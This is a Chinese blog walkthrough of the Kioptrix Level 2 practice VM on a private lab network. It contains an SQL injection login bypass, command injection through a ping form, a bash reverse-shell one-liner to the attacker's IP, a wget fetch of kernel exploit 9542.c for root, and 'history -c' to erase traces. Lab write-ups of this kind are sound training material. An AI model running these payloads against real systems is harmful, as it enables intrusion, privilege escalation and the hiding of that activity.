[合集 \- 靶机(4\)](https://github.com)[1\.\#oscp\#渗透测试 kioptix level 3靶机getshell及提权教程12\-15](https://github.com/GuijiH6/p/18607810)[2\.SolidState靶机getshell及提权详解12\-22](https://github.com/GuijiH6/p/18622735)[3\.渗透测试\-Kioptix Level 1靶机getshell及提权教程12\-06](https://github.com/GuijiH6/p/18590188)4\.\#渗透测试 kioptix level 2靶机通关教程及提权12\-24收起

> 声明！
> 文章所提到的网站以及内容，只做学习交流，其他均与本人以及泷羽sec团队无关，切勿触碰法律底线，否则后果自负！！！！


工具链接：[https://pan.quark.cn/s/530656ba5503](https://github.com)


# 一、准备阶段


复现请将靶机ip换成自己的



> kali: 192\.168\.108\.130
> 
> 
> 靶机：192\.168\.108\.136


## 1\. 找出ip端口和服务信息


### 扫出ip



```
nmap -sn 192.168.108.0/24

```

[![](https://files.mdnice.com/user/81572/d1390650-7a42-4eeb-a3e8-59b9c0986b21.png)](https://files.mdnice.com/user/81572/d1390650-7a42-4eeb-a3e8-59b9c0986b21.png)


### 扫出端口



```
nmap -p 1-65535 192.168.108.136

```

[![](https://files.mdnice.com/user/81572/a1221b9c-6a3a-4502-aec7-ed894bf5383a.png)](https://files.mdnice.com/user/81572/a1221b9c-6a3a-4502-aec7-ed894bf5383a.png)


一般扫描出端口后，尝试去访问web页面，但是只有一个登录界面


[![](https://files.mdnice.com/user/81572/975d11c0-1aec-47fb-a988-1fd68d3c9e9a.png)](https://files.mdnice.com/user/81572/975d11c0-1aec-47fb-a988-1fd68d3c9e9a.png)


### 端口对应服务信息



```
nmap -sV 192.168.108.136

```

服务信息



```
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
3306/tcp open  mysql    MySQL (unauthorized)

```

可利用信息



> OpenSSH 3\.9p1
> 
> 
> Apache httpd 2\.0\.52
> 
> 
> MySQL (unauthorized)
> 
> 
> CUPS 1\.1


## 2\. 目录扫描



```
dirb http://192.168.108.136/

```

可以看到扫出很多目录，但都是在**[http://192\.168\.108\.136/manual](https://github.com)** 这个大目录下


[![](https://files.mdnice.com/user/81572/245ff946-fb2d-4705-9069-b117da36d145.png)](https://files.mdnice.com/user/81572/245ff946-fb2d-4705-9069-b117da36d145.png)


访问此目录**[http://192\.168\.108\.136/manual](https://github.com)**,寻找可能利用的信息


## 3\. 漏洞扫描


### nmap扫描漏洞



```
nmap 192.168.108.136 -p 22,80,111,443,631,3306 -oA --script=vuln

```

会有很多漏洞


### searchsploit查找漏洞



```
searchsploit Apache httpd 2.0.52
searchsploit OpenSSH 3.9p1
searchsploit MySQL (unauthorized)
searchsploit CUPS 1.1

```

# 二、获取权限


## 1\. 访问web服务


[![](https://files.mdnice.com/user/81572/78275235-cadf-4e5a-aa48-1aac999f755e.png)](https://files.mdnice.com/user/81572/78275235-cadf-4e5a-aa48-1aac999f755e.png)


结合开放的**mysql3306**端口，可以尝试sql注入攻击，
输入万能密码尝试


[![](https://files.mdnice.com/user/81572/9e83162c-f19f-41e7-845b-f1dea7006989.png)](https://files.mdnice.com/user/81572/9e83162c-f19f-41e7-845b-f1dea7006989.png)


出现以下界面


[![](https://files.mdnice.com/user/81572/7779da4e-a16f-42d2-9361-682f88db13e2.png)](https://files.mdnice.com/user/81572/7779da4e-a16f-42d2-9361-682f88db13e2.png)


可以看到是要进行ping命令，但是没有ping的框架，
查看源代码发现以下信息


[![](https://files.mdnice.com/user/81572/bbddb22f-724c-4b3f-aa1b-c67ac17da548.png)](https://files.mdnice.com/user/81572/bbddb22f-724c-4b3f-aa1b-c67ac17da548.png)


发现登录框被闭合了


### 方法1


打开burpsuite抓包，在拦截设置，选择拦截响应包


[![](https://files.mdnice.com/user/81572/1e17d3bb-7a68-4111-9df4-6203b14fc23b.png)](https://files.mdnice.com/user/81572/1e17d3bb-7a68-4111-9df4-6203b14fc23b.png)


点击此处，然后关闭拦截即可


[![](https://files.mdnice.com/user/81572/e92b7f7d-d177-4592-bf6a-135e4517fe9f.png)](https://files.mdnice.com/user/81572/e92b7f7d-d177-4592-bf6a-135e4517fe9f.png)
删除' 然后放包


[![](https://files.mdnice.com/user/81572/4fe1bd8f-0063-4473-8cb7-90077deedbd9.png)](https://files.mdnice.com/user/81572/4fe1bd8f-0063-4473-8cb7-90077deedbd9.png)


此时就可以进行ping了


### 方法2


找到需要插入的地方，右键**编辑html**将代码复制到这里，并将**align\='center\>**修改**align\="center"\>**


[![](https://files.mdnice.com/user/81572/7a11f7d6-3adf-48e0-a3b9-5b68f8f24dc0.png)](https://files.mdnice.com/user/81572/7a11f7d6-3adf-48e0-a3b9-5b68f8f24dc0.png):[悠兔机场官网订阅](https://5tutu.com)


可以看到也是可以的


[![](https://files.mdnice.com/user/81572/db8a5977-4065-4565-9b89-57b290f9644f.png)](https://files.mdnice.com/user/81572/db8a5977-4065-4565-9b89-57b290f9644f.png)


## 2\. ping命令


在ping之前先了解一下url中的的一些符号



```
;     前面的执行完执行后面的
|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         
||    当前面的执行出错时（为假）执行后面的
&     将任务置于后台执行
&&    前面的语句为假则直接出错，后面的也不执行，前面只能为真
%0a  （换行）
%0d  （回车）

```

ping靶机


[![](https://files.mdnice.com/user/81572/5ace0e7b-ad1d-452c-8a6e-2eeb6db6a40b.png)](https://files.mdnice.com/user/81572/5ace0e7b-ad1d-452c-8a6e-2eeb6db6a40b.png)


输入以下命令



```
192.168.108.136;ls

```

[![](https://files.mdnice.com/user/81572/41ed6d68-ff04-4102-bbe1-4ccea959f1f3.png)](https://files.mdnice.com/user/81572/41ed6d68-ff04-4102-bbe1-4ccea959f1f3.png)


发现成功回显，并且经过测试，并不存在过滤的情况


## 3\. 反弹shell


这里我们使用bash反弹


开启监听端口，端口选用kali空闲端口即可



```
nc -lvvp 4444

```

[![](https://files.mdnice.com/user/81572/d0737198-44ba-425d-b6ae-63b532d70b40.png)](https://files.mdnice.com/user/81572/d0737198-44ba-425d-b6ae-63b532d70b40.png)


执行以下代码



```
127.0.0.1;bash -i >& /dev/tcp/192.168.108.130/4444 0>&1
/dev/tcp/你的kali的ip/开启的端口

```

可以看到反弹成功


[![](https://files.mdnice.com/user/81572/d9d2aaf1-445a-49c4-9940-8275b5ed3a59.png)](https://files.mdnice.com/user/81572/d9d2aaf1-445a-49c4-9940-8275b5ed3a59.png)


# 三、提权


查询版本信息



```
uname -a
lsb_release -a

```

信息如下


[![](https://files.mdnice.com/user/81572/914382e8-17c8-476e-829f-68b955dedd3c.png)](https://files.mdnice.com/user/81572/914382e8-17c8-476e-829f-68b955dedd3c.png)



```
Linux kioptrix.level2 2.6.9-55.EL
Distributor ID: CentOS
Description:    CentOS release 4.5 (Final)
Release:        4.5

```

可以知道是**centos4\.5**版本，查找该版本漏洞


找到漏洞利用脚本


[![](https://files.mdnice.com/user/81572/320d24a6-616a-49d2-b71e-94a6dde297c4.png)](https://files.mdnice.com/user/81572/320d24a6-616a-49d2-b71e-94a6dde297c4.png)


利用searchsploit命令下载脚本，这里可以看我之前总结的命令使用详情
[searchsploit命令大全](https://github.com)



```
searchsploit centos 4.5 -m 9542.c  

```

下载成功


[![](https://files.mdnice.com/user/81572/217bd81b-c3d1-4ac0-9d3f-5b583d37f1df.png)](https://files.mdnice.com/user/81572/217bd81b-c3d1-4ac0-9d3f-5b583d37f1df.png)


开启web服务



```
sudo python -m http.server 80

```

成功上传


[![](https://files.mdnice.com/user/81572/f414f296-e1b4-430f-940c-16e2a1c5770b.png)](https://files.mdnice.com/user/81572/f414f296-e1b4-430f-940c-16e2a1c5770b.png)


在目标主机上下载脚本



```
cd /tmp
wget http://192.168.108.130:80/9542.c

```

下载成功


[![](https://files.mdnice.com/user/81572/389fe4a3-8188-48ca-b6be-c88b907241ad.png)](https://files.mdnice.com/user/81572/389fe4a3-8188-48ca-b6be-c88b907241ad.png)


编译脚本



```
gcc 9542.c
chamod 777 a.out
./a.out

```

提权成功


[![](https://files.mdnice.com/user/81572/e0d5fa66-e6dc-4eaa-a74f-d0cdbf765e30.png)](https://files.mdnice.com/user/81572/e0d5fa66-e6dc-4eaa-a74f-d0cdbf765e30.png)


可以看到是有命令记录的，为了更严谨，最后每次复现完，退出的时候清除历史命令



```
history -c

```

[![](https://files.mdnice.com/user/81572/a1a9adb8-0d6c-402c-8d38-3a62e7763da7.png)](https://files.mdnice.com/user/81572/a1a9adb8-0d6c-402c-8d38-3a62e7763da7.png)


 \_\_EOF\_\_

   ![](https://github.com/GuijiH6)track  - **本文链接：** [https://github.com/GuijiH6/p/18625220](https://github.com)
 - **关于博主：** 评论和私信会在第一时间回复。或者[直接私信](https://github.com)我。
 - **版权声明：** 本博客所有文章除特别声明外，均采用 [BY\-NC\-SA](https://github.com "BY-NC-SA") 许可协议。转载请注明出处！
 - **声援博主：** 如果您觉得文章对您有帮助，可以点击文章右下角**【[推荐](javascript:void(0);)】**一下。
     
